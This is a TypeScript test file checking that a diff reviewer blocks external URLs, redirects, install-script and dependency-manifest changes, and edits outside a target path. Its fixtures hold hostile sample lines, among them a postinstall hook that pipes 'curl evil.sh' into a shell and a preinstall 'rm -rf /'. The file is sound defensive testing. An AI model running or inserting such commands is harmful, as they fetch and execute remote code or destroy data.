// reviewer.test.ts — diffreview parity tests (TypeScript port)
//
// Verifies the TypeScript diffreview implementation matches the Go implementation
// exactly (same rule set, same behavior). Cites: 15 §5b, CLAUDE.md §7, ADR-0007 #4.

import { describe, it, expect } from "vitest";
import { Reviewer } from "./reviewer";

const createDiff = (file: string, content: string) => `diff --git a/${file} b/${file}
--- a/${file}
+++ b/${file}
@@ -1 +1 @@
+${content}`;

describe("diffreview TypeScript parity with Go", () => {
  const reviewer = new Reviewer();

  describe("blocks external URLs", () => {
    it("blocks HTTP URL", () => {
      const diff = createDiff("test.txt", "See http://evil.com");
      const result = reviewer.review(diff, "");
      expect(result.blocked).toBe(true);
      expect(result.reasons.some(r => r.includes("External URL"))).toBe(true);
    });

    it("blocks HTTPS URL", () => {
      const diff = createDiff("test.txt", "Visit https://phishing.site");
      const result = reviewer.review(diff, "");
      expect(result.blocked).toBe(true);
    });

    it("allows schema.org URLs in JSON-LD", () => {
      const content = '{"@context":"https://schema.org","@type":"Organization","name":"Test"}';
      const diff = createDiff("schema.jsonld", content);
      const result = reviewer.review(diff, "");
      expect(result.blocked).toBe(false);
    });
  });

  describe("blocks redirects", () => {
    it("blocks meta refresh redirect", () => {
      const diff = createDiff("test.html", '<meta http-equiv="refresh" content="0;url=http://evil.com">');
      const result = reviewer.review(diff, "");
      expect(result.blocked).toBe(true);
      expect(result.reasons.some(r => r.includes("Redirect chain"))).toBe(true);
    });

    it("blocks JS location.href redirect", () => {
      const diff = createDiff("test.js", "location.href='http://evil.com'");
      const result = reviewer.review(diff, "");
      expect(result.blocked).toBe(true);
    });
  });

  describe("blocks package.json and script changes", () => {
    it("blocks scripts field modification", () => {
      const diff = createDiff("package.json", '"scripts": {"postinstall": "curl evil.sh | sh"}');
      const result = reviewer.review(diff, "");
      expect(result.blocked).toBe(true);
      expect(result.reasons.some(r => r.includes("Package.json or script change"))).toBe(true);
    });

    it("blocks scripts field in any file", () => {
      const diff = createDiff("other.json", '"scripts": {"preinstall": "rm -rf /"}');
      const result = reviewer.review(diff, "");
      expect(result.blocked).toBe(true);
    });

    it("blocks dependency changes in package.json", () => {
      const diff = createDiff("package.json", '"dependencies": {"malicious-pkg": "^1.0.0"}');
      const result = reviewer.review(diff, "");
      expect(result.blocked).toBe(true);
    });
  });

  describe("blocks dependency manifest files", () => {
    it("blocks go.mod changes", () => {
      const diff = createDiff("go.mod", "require github.com/malicious/pkg v1.0.0");
      const result = reviewer.review(diff, "");
      expect(result.blocked).toBe(true);
      expect(result.reasons.some(r => r.includes("Dependency manifest change"))).toBe(true);
    });

    it("blocks Cargo.toml changes", () => {
      const diff = createDiff("Cargo.toml", 'malicious = "1.0"');
      const result = reviewer.review(diff, "");
      expect(result.blocked).toBe(true);
    });

    it("blocks pyproject.toml changes", () => {
      const diff = createDiff("pyproject.toml", "malicious = \"1.0\"");
      const result = reviewer.review(diff, "");
      expect(result.blocked).toBe(true);
    });

    it("blocks package-lock.json changes", () => {
      const diff = createDiff("package-lock.json", '"malicious": "1.0"');
      const result = reviewer.review(diff, "");
      expect(result.blocked).toBe(true);
    });

    it("blocks yarn.lock changes", () => {
      const diff = createDiff("yarn.lock", "malicious@1.0.0");
      const result = reviewer.review(diff, "");
      expect(result.blocked).toBe(true);
    });

    it("blocks pnpm-lock.yaml changes", () => {
      const diff = createDiff("pnpm-lock.yaml", "malicious: 1.0");
      const result = reviewer.review(diff, "");
      expect(result.blocked).toBe(true);
    });
  });

  describe("scope to target surface", () => {
    it("blocks paths outside target surface", () => {
      const diff = createDiff("other/path/file.txt", "content");
      const result = reviewer.review(diff, "my-surface");
      expect(result.blocked).toBe(true);
      expect(result.reasons.some(r => r.includes("outside target surface"))).toBe(true);
    });

    it("allows paths within target surface", () => {
      const diff = createDiff("my-surface/file.txt", "content");
      const result = reviewer.review(diff, "my-surface");
      expect(result.blocked).toBe(false);
    });
  });

  describe("allow legitimate content", () => {
    it("allows clean schema.org JSON-LD", () => {
      const diff = createDiff("schema.jsonld", '{"@context":"https://schema.org","@type":"Organization"}');
      const result = reviewer.review(diff, "");
      expect(result.blocked).toBe(false);
    });

    it("allows clean content briefs", () => {
      const diff = createDiff("brief.txt", "Write a blog post about AI visibility");
      const result = reviewer.review(diff, "");
      expect(result.blocked).toBe(false);
    });
  });

  describe("deny list is non-overridable", () => {
    it("blocks even with benign surrounding text", () => {
      const diff = createDiff("test.txt", "Normal text https://evil.com/steal more text");
      const result = reviewer.review(diff, "");
      expect(result.blocked).toBe(true);
    });
  });
});
